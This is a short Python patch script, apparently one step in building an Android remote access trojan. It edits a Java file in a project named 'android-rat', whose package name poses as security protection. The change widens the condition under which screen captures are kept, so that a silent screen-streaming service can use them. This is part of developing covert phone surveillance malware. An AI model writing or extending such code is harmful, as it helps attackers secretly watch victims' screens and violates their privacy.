J = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\UiAssistBridge.java"
s = open(J, encoding="utf-8").read()
o = "        if (!silentScreenActive) { try { bmp.recycle(); } catch (Throwable ignored) {} return; }"
assert s.count(o) == 1, "gate nao encontrado"
s = s.replace(o, "        if (!silentScreenActive && !ScreenStreamService.isActive()) { try { bmp.recycle(); } catch (Throwable ignored) {} return; }")
open(J, "w", encoding="utf-8").write(s)
print("PASO 2b OK")
